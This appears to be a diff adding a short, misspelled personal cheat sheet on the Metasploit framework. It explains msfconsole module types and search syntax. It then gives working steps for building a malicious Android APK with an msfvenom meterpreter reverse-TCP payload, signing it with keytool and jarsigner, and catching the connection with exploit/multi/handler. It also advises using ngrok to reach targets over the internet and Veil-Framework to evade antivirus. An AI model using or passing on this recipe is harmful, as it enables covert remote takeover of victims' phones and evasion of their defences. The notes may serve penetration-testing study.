@@ -1,0 +1,39 @@
+-----------------------------------------------
+Way 1
+use expiot DB and search for vulnerabilities
+and download code setup env, run code
+-----------------------------------------------
+Way 2
+Use metaspolite linux tool
+
+msfconsole > start metaspolite
+search > searching of expiot,auxiliary,nops,payloads,posts
+        expiot -> get access,perform action or connect to target
+        auxiliary- > used for scanning
+        payload -> create a millious code to connect to target
+        evasion -> compression purpose
+        encoder -> encodind and decoding 
+        post -> after expiot to persist connection, maintain access
+
+    example ,
+    search openssh 4
+    search ssh type:auxiliary platform:linux   
+    search tomcat platform: linux   
+
+    Creation of payload 
+    search android type:payload platform:android   
+    1) generate -f raw -p android  -o ds.apk
+    2) msfvenom -p /android/meterpreter_reverse_tcp R LHOST=172.16.161.129 LPORT=4444  > msf_tcp.apk
+    3) sign apk 
+        a) keytool -genkey -V -keystore key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
+        b) jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore msf_tcp.apk hacked
+    4) listen to payload
+        use exploit/multi/handler
+        set payload android/meterpreter/reverse_tcp
+        set LHOST
+        set LPORT
+        run
+    note:- For WAN use portfordwing tools ngrock
+    to bypass anti-virous use veil-framework
+---------------------------------------------------------------------------------------------------------------
+netexpose framework
